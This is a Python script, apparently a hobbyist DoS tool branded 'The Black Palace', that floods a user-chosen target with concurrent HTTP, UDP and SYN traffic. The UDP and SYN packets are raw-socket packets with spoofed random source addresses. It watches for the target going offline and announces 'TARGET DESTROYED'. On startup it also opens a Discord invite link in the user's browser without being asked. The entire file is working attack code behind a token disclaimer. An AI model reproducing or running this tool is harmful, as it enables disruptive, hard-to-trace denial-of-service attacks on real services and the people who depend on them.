#!/usr/bin/env python3
"""
MIXED DOS TOOL - HTTP (requests) + UDP + SYN floods
- HTTP: measures success/failure and avg response time (requests library)
- UDP: optional spoofing (root/Linux only)
- SYN: raw socket flood (root/Linux only)
Use only against YOUR OWN infrastructure.
"""

import requests
import socket
import struct
import random
import time
import threading
import sys
import os
import signal
import webbrowser          # <-- added to open Discord link
from datetime import datetime

# ========================= UI (from second script) =========================
_current_green = 255
_fade_duration = 60.0

def set_fade_ratio(elapsed: float):
    global _current_green
    if elapsed >= _fade_duration:
        _current_green = 0
    else:
        _current_green = max(0, int(255 * (1 - elapsed / _fade_duration)))

def col_green(text: str, fixed: int = None) -> str:
    g = fixed if fixed is not None else _current_green
    if g <= 0:
        return f"\033[0m{text}\033[0m"
    return f"\033[38;2;0;{g};0m{text}\033[0m"

banner_lines = [
    "╔══════════════════════════════════════════════════════════════════════════════════════════╗",
    "║     ████████╗██████╗ ██████╗     ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗  ║",
    "║     ╚══██╔══╝██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗║",
    "║        ██║   ██████╔╝██████╔╝    ██║     ██████╔╝███████║███████╗███████║█████╗  ██████╔╝║",
    "║        ██║   ██╔══██╗██╔══██╗    ██║     ██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██╔══██╗║",
    "║        ██║   ██████╔╝██████╔╝    ╚██████╗██║  ██║██║  ██║███████║██║  ██║███████╗██║  ██║║",
    "║        ╚═╝   ╚═════╝ ╚═════╝      ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝║",
    "╠══════════════════════════════════════════════════════════════════════════════════════════╣",
    "║           The Black Palace - dos v0.6 (mixed with requests HTTP metrics)                 ║",
    "║                 dos tool by TBP team + mixed edition                                     ║",
    "╚══════════════════════════════════════════════════════════════════════════════════════════╝",
]

for idx, line in enumerate(banner_lines):
    green_val = int(255 * (1 - idx / max(1, len(banner_lines)-1)))
    print(col_green(line, green_val))

# ---------- Open Discord invite link ----------
print(col_green("\n[+] Opening Discord invite link..."))
webbrowser.open("https://discord.gg/Z9nc6sAFyw")
# ==============================================

# ========================= ADMIN CHECK =========================
def is_admin() -> bool:
    if sys.platform == "win32":
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    else:
        return os.geteuid() == 0

admin = is_admin()
if not admin:
    print(col_green("[!] Not running as Admin/root. SYN flood disabled. UDP spoofing disabled.", 200))
else:
    print(col_green("[+] Running with admin/root privileges. Raw sockets available.", 200))

# ========================= TARGET INPUT =========================
target = input(col_green("[?] Target IP or domain > ")).strip()
if not target:
    print(col_green("[!] No target. Exiting."))
    sys.exit(1)

port_input = input(col_green("[?] Port (default 80) > ")).strip()
port = int(port_input) if port_input.isdigit() else 80

http_threads = int(input(col_green("[?] HTTP threads (requests) (default 100) > ") or "100"))
udp_threads = int(input(col_green("[?] UDP threads (default 150) > ") or "150"))
syn_threads = int(input(col_green("[?] SYN threads (default 80, requires root/raw socket) > ") or "80"))
duration = int(input(col_green("[?] Attack duration (0 = infinite) > ") or "0"))
delay = float(input(col_green("[?] Delay (seconds) between packets (0 = max) > ") or "0"))

print(col_green(f"\n[+] Target: {target}:{port} | HTTP(req): {http_threads} | UDP: {udp_threads} | SYN: {syn_threads}"))

try:
    target_ip = socket.gethostbyname(target)
except socket.gaierror:
    print(col_green("[!] Cannot resolve hostname."))
    sys.exit(1)

# Base URL for HTTP requests
BASE_URL = f"http://{target_ip}:{port}"

stop_event = threading.Event()
target_alive = True

# Extended stats: for HTTP we track success, failed, total_ms
stats = {
    "http_success": 0,
    "http_failed": 0,
    "http_total_ms": 0,
    "udp": 0,
    "syn": 0
}
stats_lock = threading.Lock()

# ========================= RAW SOCKET HELPERS (from second script) =========================
def create_raw_socket():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        return sock
    except PermissionError:
        return None
    except Exception:
        return None

def checksum(data):
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + (data[i+1] if i+1 < len(data) else 0)
        s = (s + w) & 0xffffffff
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def build_ip_header(src_ip, dst_ip, protocol, payload_len):
    ip_ver_ihl = 0x45
    tos = 0
    total_len = 20 + payload_len
    ip_id = random.randint(1, 65535)
    frag_off = 0
    ttl = 255
    proto = protocol
    checksum_val = 0
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ver_ihl, tos, total_len, ip_id, frag_off,
                            ttl, proto, checksum_val, src, dst)
    chk = checksum(ip_header[:10] + b'\x00\x00' + ip_header[12:])
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ver_ihl, tos, total_len, ip_id, frag_off,
                            ttl, proto, chk, src, dst)
    return ip_header

def build_tcp_header(src_port, dst_port, seq, ack, flags, window, urgptr):
    tcp_header = struct.pack('!HHLLBBHHH',
                             src_port, dst_port, seq, ack,
                             (5 << 4), flags, window,
                             0, urgptr)
    return tcp_header

def tcp_checksum(ip_header, tcp_header, payload):
    src_ip = ip_header[12:16]
    dst_ip = ip_header[16:20]
    protocol = socket.IPPROTO_TCP
    tcp_len = len(tcp_header) + len(payload)
    pseudo_header = struct.pack('!4s4sBBH',
                                src_ip, dst_ip, 0, protocol, tcp_len)
    pseudo_header += tcp_header + payload
    if len(pseudo_header) % 2 == 1:
        pseudo_header += b'\x00'
    return checksum(pseudo_header)

# ========================= ATTACK WORKERS =========================
def http_flood():
    """HTTP flood using requests library (with success/fail & timing)"""
    session = requests.Session()
    while not stop_event.is_set() and target_alive:
        try:
            path = f"/{random.randint(1, 999999)}?{random.randint(1, 999999)}"
            url = BASE_URL + path
            start = time.time()
            r = session.get(url, timeout=5, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "*/*",
                "Connection": "close"
            })
            ms = (time.time() - start) * 1000
            with stats_lock:
                if r.status_code == 200:
                    stats["http_success"] += 1
                else:
                    stats["http_failed"] += 1
                stats["http_total_ms"] += ms
        except Exception:
            with stats_lock:
                stats["http_failed"] += 1
        if delay > 0:
            time.sleep(delay)
    session.close()

def udp_flood():
    can_spoof = (sys.platform != "win32") and admin
    sock_normal = None
    raw_sock = None
    if not can_spoof:
        sock_normal = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    else:
        raw_sock = create_raw_socket()
        if not raw_sock:
            can_spoof = False
            sock_normal = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while not stop_event.is_set() and target_alive:
        try:
            payload = os.urandom(random.randint(512, 1460))
            if can_spoof:
                src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                udp_len = 8 + len(payload)
                udp_header = struct.pack('!HHHH', random.randint(1024,65535), port, udp_len, 0)
                packet = build_ip_header(src_ip, target_ip, socket.IPPROTO_UDP, udp_len) + udp_header + payload
                raw_sock.sendto(packet, (target_ip, 0))
            else:
                sock_normal.sendto(payload, (target_ip, port))
            with stats_lock:
                stats["udp"] += 1
            if delay > 0:
                time.sleep(delay)
        except:
            pass
    if raw_sock:
        raw_sock.close()
    if sock_normal:
        sock_normal.close()

def syn_flood():
    if sys.platform == "win32" or not admin:
        return
    raw_sock = create_raw_socket()
    if not raw_sock:
        print(col_green("[!] SYN flood disabled: cannot create raw socket.", 200))
        return
    while not stop_event.is_set() and target_alive:
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            src_port = random.randint(1024, 65535)
            seq = random.randint(0, 0xFFFFFFFF)
            tcp_flags = 0x02
            tcp_header = build_tcp_header(src_port, port, seq, 0, tcp_flags, 5840, 0)
            payload = b''
            ip_header = build_ip_header(src_ip, target_ip, socket.IPPROTO_TCP, len(tcp_header) + len(payload))
            tcp_checksum_val = tcp_checksum(ip_header, tcp_header, payload)
            tcp_header = struct.pack('!HHLLBBHHH',
                                     src_port, port, seq, 0,
                                     (5 << 4), tcp_flags, 5840,
                                     tcp_checksum_val, 0)
            packet = ip_header + tcp_header + payload
            raw_sock.sendto(packet, (target_ip, 0))
            with stats_lock:
                stats["syn"] += 1
            if delay > 0:
                time.sleep(delay)
        except:
            pass
    raw_sock.close()

# ========================= MONITOR (enhanced with HTTP metrics) =========================
def monitor():
    global target_alive
    start_time = time.time()
    last_time = start_time
    last_stats = {"http_success": 0, "http_failed": 0, "http_total_ms": 0, "udp": 0, "syn": 0}
    fail_count = 0

    while not stop_event.is_set() and target_alive:
        time.sleep(2)
        elapsed = time.time() - start_time
        set_fade_ratio(elapsed)

        with stats_lock:
            cur = stats.copy()

        dt = time.time() - last_time
        h_success_rate = (cur["http_success"] - last_stats["http_success"]) / dt if dt > 0 else 0
        h_fail_rate   = (cur["http_failed"] - last_stats["http_failed"]) / dt if dt > 0 else 0
        u_rate = (cur["udp"] - last_stats["udp"]) / dt if dt > 0 else 0
        s_rate = (cur["syn"] - last_stats["syn"]) / dt if dt > 0 else 0

        http_total_req = cur["http_success"] + cur["http_failed"]
        avg_ms = cur["http_total_ms"] / max(cur["http_success"], 1)

        print(col_green(f"[STATS] HTTP: {http_total_req} req "
                        f"(success: {cur['http_success']} ({h_success_rate:.0f}/s), "
                        f"failed: {cur['http_failed']} ({h_fail_rate:.0f}/s), "
                        f"avgRT: {avg_ms:.0f}ms) | "
                        f"UDP: {cur['udp']} ({u_rate:.0f}/s) | "
                        f"SYN: {cur['syn']} ({s_rate:.0f}/s)"))

        last_stats = cur
        last_time = time.time()

        # Optional health check (TCP connect)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            s.connect((target_ip, port))
            s.close()
            fail_count = 0
        except:
            fail_count += 1
            if fail_count >= 3:
                print(col_green("\n╔═══════════════════════════════════════════╗"))
                print(col_green("║     TARGET DESTROYED                        ║"))
                print(col_green("║      your target is down                    ║"))
                print(col_green("╚═════════════════════════════════════════════╝"))
                target_alive = False
                stop_event.set()
                break

def main():
    global target_alive
    print(col_green(f"[+] Launching {http_threads} HTTP (requests) | {udp_threads} UDP | {syn_threads} SYN threads..."))

    threads = []
    for _ in range(http_threads):
        t = threading.Thread(target=http_flood, daemon=True)
        t.start()
        threads.append(t)
    for _ in range(udp_threads):
        t = threading.Thread(target=udp_flood, daemon=True)
        t.start()
        threads.append(t)
    for _ in range(syn_threads):
        t = threading.Thread(target=syn_flood, daemon=True)
        t.start()
        threads.append(t)

    mon = threading.Thread(target=monitor, daemon=True)
    mon.start()
    threads.append(mon)

    try:
        if duration > 0:
            time.sleep(duration)
            print(col_green("\n[+] Time limit reached. Stopping..."))
            stop_event.set()
        else:
            print(col_green("[+] Attack running (infinite). Press Ctrl+C to stop."))
            while not stop_event.is_set() and target_alive:
                time.sleep(0.5)
    except KeyboardInterrupt:
        print(col_green("\n[!] Stopped by user."))
    finally:
        stop_event.set()
        time.sleep(1)
        with stats_lock:
            http_total = stats["http_success"] + stats["http_failed"]
            avg_rt = stats["http_total_ms"] / max(stats["http_success"], 1)
            print(col_green(f"\n[+] Final Statistics:"))
            print(col_green(f"    HTTP requests   : {http_total} (success: {stats['http_success']}, failed: {stats['http_failed']}, avgRT: {avg_rt:.0f}ms)"))
            print(col_green(f"    UDP packets     : {stats['udp']}"))
            print(col_green(f"    SYN packets     : {stats['syn']}"))
        print(col_green("[+] Goodbye."))

if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda s, f: stop_event.set())
    try:
        main()
    except Exception as e:
        print(col_green(f"[!] Fatal error: {e}", 150))
    finally:
        stop_event.set()
